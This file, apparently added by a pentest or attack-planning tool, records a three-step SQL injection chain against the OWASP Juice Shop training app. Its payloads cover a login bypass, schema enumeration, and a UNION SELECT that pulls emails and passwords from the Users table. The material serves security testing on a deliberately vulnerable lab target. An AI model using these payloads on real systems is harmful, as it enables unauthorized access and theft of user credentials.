@@ -1,0 +1,55 @@
+{
+ "title": "Juice Shop - SQL Injection to Data Exfiltration",
+ "description": "SQL injection vulnerability leads to database access and sensitive data exfiltration",
+ "steps": [
+ {
+ "step_number": 1,
+ "vulnerability_type": "SQL Injection",
+ "description": "SQL injection in login or search field",
+ "endpoint": "/rest/user/login or /rest/products/search",
+ "payload": "admin' OR '1'='1'--",
+ "prerequisites": [],
+ "outcome": "SQL injection vulnerability confirmed",
+ "evidence": null
+ },
+ {
+ "step_number": 2,
+ "vulnerability_type": "SQL Injection",
+ "description": "Enumerate database structure and extract table names",
+ "endpoint": "Same as Step 1",
+ "payload": "' UNION SELECT table_name FROM information_schema.tables--",
+ "prerequisites": [
+ "SQL injection vulnerability confirmed"
+ ],
+ "outcome": "Database structure enumerated",
+ "evidence": null
+ },
+ {
+ "step_number": 3,
+ "vulnerability_type": "SQL Injection",
+ "description": "Extract sensitive user data (passwords, emails, credit cards)",
+ "endpoint": "Same as Step 1",
+ "payload": "' UNION SELECT email, password FROM Users--",
+ "prerequisites": [
+ "Database structure enumerated"
+ ],
+ "outcome": "Sensitive data exfiltrated",
+ "evidence": null
+ }
+ ],
+ "impact": "High",
+ "severity": "High",
+ "prerequisites": [
+ "Access to login or search functionality"
+ ],
+ "context": "OWASP Juice Shop e-commerce application",
+ "discovered_by": null,
+ "discovered_at": "2025-12-31T11:24:17.478082",
+ "validated": false,
+ "tags": [
+ "database",
+ "juice-shop",
+ "sql-injection",
+ "data-exfiltration"
+ ]
+}
